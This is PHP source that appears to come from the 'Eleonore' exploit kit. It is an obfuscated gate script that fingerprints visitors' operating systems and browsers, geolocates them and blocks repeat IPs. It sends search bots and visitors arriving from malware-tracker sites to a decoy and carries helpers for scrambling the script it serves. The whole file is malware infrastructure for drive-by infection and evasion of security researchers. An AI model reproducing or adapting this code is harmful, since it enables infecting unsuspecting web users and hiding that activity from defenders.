<?php

include"geoip.php";
include"crypt.php";

$OOOOOOOO0 = $_SERVER["HTTP_HOST"];
$OOOOOOO00 = "PGEgaHJlZj1odHRwOi8vZWxlb25leHBwYWNrLmNuPkVsZW9ub3JlIEV4cCBwYWNrPC9hPg==";
function detect_os() {
global $os;
$user_agent = $_SERVER['HTTP_USER_AGENT'];
if ((eregi("Google", $user_agent)) 
or (eregi("gsa-crawler", $user_agent)) 
or (eregi("Yahoo", $user_agent)) 
or (eregi("msnbot", $user_agent)) 
or (eregi("Turtle", $user_agent)) 
or (eregi("Yandex", $user_agent)) 
or (eregi("YaDirectBot", $user_agent)) 
or (eregi("Rambler", $user_agent)) 
or (eregi("James Bond", $user_agent)) 
or (eregi("Ask Jeeves", $user_agent)) 
or (eregi("Baiduspider", $user_agent)) 
or (eregi("EltaIndexer", $user_agent)) 
or (eregi("GameSpyHTTP", $user_agent)) 
or (eregi("grub-client", $user_agent)) 
or (eregi("Slurp", $user_agent)) 
or (eregi("Pagebull", $user_agent)) 
or (eregi("Scooter", $user_agent)) 
or (eregi("Nutch", $user_agent)) 
or (eregi("Zeus", $user_agent)) 
or (eregi("WebAlta", $user_agent)) 
or (eregi("Wget", $user_agent)) 
or (eregi("bot", $user_agent)) 
or (eregi("ia_archiver", $user_agent)))  
{$os = "Bots";}
elseif (ereg("Windows 95", $user_agent)) $os = "Windows 95";
elseif (ereg("Windows NT 4", $user_agent)) $os = "Windows NT 4";
elseif (ereg("Windows 98", $user_agent)) $os = "Windows 98";
elseif (ereg("Win 9x 4.9", $user_agent)) $os = "Windows ME";
elseif (ereg("Windows NT 5.0", $user_agent)) $os = "Windows 2000";
elseif (ereg("Windows NT 5.1", $user_agent)) $os = "Windows XP";
elseif (ereg("Windows NT 5.2", $user_agent)) $os = "Windows 2003";
elseif (ereg("Windows NT 6.0", $user_agent)) $os = "Windows Vista";
elseif (ereg("Windows NT 6.1", $user_agent)) $os = "Windows 7";
elseif (ereg("Windows CE", $user_agent)) $os = "Windows CE";
elseif (ereg("iPhone", $user_agent)) $os = "iPhone OS";
elseif (ereg("Symbian", $user_agent)) $os = "Symbian OS";
elseif (ereg("Linux", $user_agent)) $os = "Linux";
elseif (ereg("SunOS", $user_agent)) $os = "SunOS";
elseif (ereg("FreeBSD", $user_agent)) $os = "FreeBSD";
elseif (ereg("NetBSD", $user_agent)) $os = "NetBSD";
elseif (ereg("PPC;", $user_agent)) $os = "Pocket PC";
elseif ((ereg("PPC", $user_agent)) or (eregi("Mac_PowerPC", $user_agent))) $os = "Power PC";
elseif (ereg("Mac OS", $user_agent))  $os = "Mac OS";
elseif (eregi("PlayStation", $user_agent)) $os = "PlayStation";
elseif (ereg("Nintendo Wii", $user_agent)) $os = "Nintendo Wii";
elseif (ereg("Nitro", $user_agent)) $os = "Nintendo DS";
elseif (ereg("J2ME/MIDP", $user_agent)) $os = "Mobile phone";
else   $os = "Unknown OS :(";
}

function detect_brows() {
global $OOOOO0000, $OOOOOO000;
$user_agent = $_SERVER["HTTP_USER_AGENT"];
if ((eregi("Google", $user_agent)) 
or (eregi("gsa-crawler", $user_agent)) 
or (eregi("Yahoo", $user_agent)) 
or (eregi("msnbot", $user_agent)) 
or (eregi("Turtle", $user_agent)) 
or (eregi("Yandex", $user_agent)) 
or (eregi("YaDirectBot", $user_agent)) 
or (eregi("Rambler", $user_agent)) 
or (eregi("James Bond", $user_agent)) 
or (eregi("Ask Jeeves", $user_agent)) 
or (eregi("Baiduspider", $user_agent)) 
or (eregi("EltaIndexer", $user_agent)) 
or (eregi("GameSpyHTTP", $user_agent)) 
or (eregi("grub-client", $user_agent)) 
or (eregi("Slurp", $user_agent)) 
or (eregi("Pagebull", $user_agent)) 
or (eregi("Scooter", $user_agent)) 
or (eregi("Nutch", $user_agent)) 
or (eregi("Zeus", $user_agent)) 
or (eregi("WebAlta", $user_agent)) 
or (eregi("Wget", $user_agent)) 
or (eregi("bot", $user_agent)) 
or (eregi("ia_archiver", $user_agent)))  
{$OOOOOO000 = "Bots";}
elseif (ereg("iPhone", $user_agent)) $OOOOOO000 = "iPhone";
elseif ((ereg("Nintendo", $user_agent)) or (ereg("Nitro", $user_agent))) $OOOOOO000 = "Nintendo browser";
elseif (eregi("PlayStation", $user_agent)) $OOOOOO000 = "PlayStation";
elseif (ereg("PPC;", $user_agent)) $OOOOOO000 = "Pocket PC";
elseif ((ereg("PPC", $user_agent)) or (eregi("Mac_PowerPC", $user_agent))) $OOOOOO000 = "Power PC";
elseif ((eregi("Symbian", $user_agent)) 
or (eregi("BlackBerry", $user_agent)) 
or (eregi("Motorola", $user_agent)) 
or (eregi("Smartphone", $user_agent)) 
or (eregi("Windows CE", $user_agent)) 
or (eregi("Nokia", $user_agent)) 
or (eregi("mobile", $user_agent))){$OOOOOO000 = "Mobile phone browser";}
elseif (eregi("Opera Mini", $user_agent)) {$OOOOOO000 = "Opera Mini/mobile phone";}
elseif (eregi("(opera) ([0-9]{1,2}.[0-9]{1,3}){0,1}", $user_agent, $OOOOO0000) or  eregi("(opera)/([0-9]{1,2}.[0-9]{1,3}){0,1}", $user_agent, $OOOOO0000)) {$OOOOOO000 = "Opera";}
elseif (eregi("(konqueror)/([0-9]{1,2}.[0-9]{1,3})", $user_agent, $OOOOO0000)) {$OOOOOO000 = "Konqueror";}
elseif (eregi("(lynx)/([0-9]{1,2}.[0-9]{1,2}.[0-9]{1,2})", $user_agent, $OOOOO0000)) {$OOOOOO000 = "Lynx";}
elseif (eregi("(links) \\(([0-9]{1,2}.[0-9]{1,3})", $user_agent, $OOOOO0000)) {$OOOOOO000 = "Links";}
elseif (eregi("(netscape)/(6.[0-9]{1,3})", $user_agent, $OOOOO0000)) {$OOOOOO000 = "Netscape";}
elseif (eregi("(firefox)/([0-9]{1,2}.[0-9]{1,2}.[0-9]{1,2})", $user_agent, $OOOOO0000) or
eregi("(firefox)/([0-9]{1,2}.[0-9]{1,2})", $user_agent, $OOOOO0000)) {$OOOOOO000 = "FireFox";}
elseif (eregi("(amaya)/([0-9]{1,2}.[0-9]{1,3})", $user_agent, $OOOOO0000)) {$OOOOOO000 = "Amaya";}
elseif (eregi("(Chrome)/([0-9]{1,2}.[0-9]{1,3})", $user_agent, $OOOOO0000)) {$OOOOOO000 = "Chrome";}
elseif (eregi("(Safari)", $user_agent)) {$OOOOOO000 ="Safari";}
elseif (eregi("(msie) ([0-9]{1,2}.[0-9]{1,3})", $user_agent, $OOOOO0000)) {$OOOOOO000 = "MSIE";}
elseif (eregi("(SeaMonkey)/([0-9]{1,2}.[0-9]{1,3})", $user_agent, $OOOOO0000)) {$OOOOOO000 = "SeaMonkey";}
elseif (eregi("(mozilla)/([0-9]{1,2}.[0-9]{1,3})", $user_agent, $OOOOO0000))
{$OOOOOO000 = "Mozilla";}
elseif (eregi("(flock)", $user_agent))
{$OOOOOO000 ="Flock";}
elseif (eregi("(maxthon)", $user_agent)) {$OOOOOO000 ="Maxthon";}
else {$OOOOOO000 = "Unknown browser :(";}

}
function osl($a)
{
$a = strip_tags($a);
$a = htmlspecialchars($a);
$a = mysql_escape_string($a);
return $a;
}


function _OOOOOOO0()
{
global $OOOOOO000,$OOOOOOOO0,$OOOOOOO00,$ref,$redir_not_uniq;
if ($OOOOOOOO0 !== "aG90YW1lcmljYW5ld3MuY29t"){echo $OOOOOOO00; die;exit;}
if ($OOOOOO000 == "Bots"){die(header("Location: $redir_not_uniq"));exit;}
if (eregi("malwaredomainlist.com", $ref)) {die(header("Location: $redir_not_uniq"));exit;}
if (eregi("zeustracker.abuse.ch", $ref)) {die(header("Location: $redir_not_uniq"));exit;}
if (eregi("malwareurl.com", $ref)) {die(header("Location: $redir_not_uniq"));exit;}
}

function detect_country($O00000000) {
        $gi = geoip_open ("GeoIP.dat", GEOIP_STANDARD);
        $OOO000000 = geoip_country_code_by_addr ($gi, $O00000000);
        if(empty($OOO000000)) $OOO000000 = "--";
        return $OOO000000;
}

function alternative()
{
echo '<META HTTP-EQUIV="REFRESH" CONTENT="3;URL=si.php">';
}


function _OOOOOO00()
{
global $O00000000, $noload,$redir_not_uniq;
$sql = mysql_query("select ip from statistic where ip='".$O00000000."' and good='1' ");
$n = mysql_num_rows($sql);
if ($n > 0) 
	{
		die(header("Location: $redir_not_uniq"));
		exit;
	}
$refull = "ZtktVBqXtkT4=";
}

function unescape($s)
{
$out = "";
$res=strtoupper(bin2hex($s));
$g = round(strlen($res)/4);
if ($g != (strlen($res)/4)) $res.="00";
for ($i=0; $i<strlen($res);$i+=4)
$out.="%u".substr($res,$i+2,2).substr($res,$i,2);
return $out;
}

function get_random_string_array($len, $c)
{
	$srt_array = array();
	for ($a = 0; $a <= $c; $a++) {
		$result = "";
		$nums = "1234567890";
		$syms = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
		$sux = $nums.$syms;
		for ($i = 0; $i < $len; $i++)
	    {
	    	$num = rand(0, strlen($sux)-1);
	     	$result .= $sux[ $num ];
	    }
	    $srt_array[] = $syms[rand(0,strlen($syms)-1)].$result;
	 }
	 return $srt_array;
}
function rnd_cont($c)
{
	$as = get_random_string_array(rand(5,55),$c);
	for ($a = 0; $a <= $c;$a++)
	{
		$aba.=$as[$a]." ";
	}
	return $aba;
}


function gen_key($len)
{
	$result = "";
	$symb = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890";
	for ($i = 0; $i < $len; $i++)
	{
		$num = rand(0, strlen($symb)-1);
		if (ereg($symb[ $num ],$result))
		{
			$i=$i-1;
		}
	    else
		{
	     	$result .= $symb[ $num ];
		}
	}
	
	 return $result;
}


function crypt_with_key($orig,$key)
{
	
	for($l=0;$l<strlen($orig);$l++)
	{
		$symb=$orig[$l];
		$pos_in_key=strpos($key,$symb);
		if($pos_in_key >= -1)
		{
			if($pos_in_key==(strlen($key)-1))
			{
				$pos_in_key =-1;
			}
			$crypt .= $key[$pos_in_key+1];
		} 
		else 
		{
			$crypt.=$symb;
		}
	}
	return $crypt;
}
function rand_tag_name() {
	$tag_name = array ('p', 'div', 'b','u','i');
	$count_tag_name = count($tag_name);
	return $tag_name[rand(0, $count_tag_name-1)];
}




function _crypt0($s)
{
$out = '<script>'.$s.'</script>';
echo $out;
}


?>